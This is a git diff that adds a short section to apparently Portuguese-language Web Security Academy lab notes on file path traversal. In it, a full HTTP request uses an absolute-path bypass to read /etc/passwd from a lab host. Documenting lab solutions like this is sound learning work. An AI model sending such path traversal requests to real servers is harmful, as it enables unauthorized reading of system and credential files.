@@ -16,6 +16,23 @@ Connection: close
 
 ````
 
+### >> 2. File path traversal, traversal sequences blocked with absolute path bypass
+Crie uma requisição GET contendo o caminho do arquivo a ser lido
+
+````
+GET /image?filename=/etc/passwd HTTP/1.1
+Host: ac601f011f09bc6dc05120b5004a00fa.web-security-academy.net
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
+Connection: close
+
+
+````
+
+
+
 
 ## File upload vulnerabilities 
 
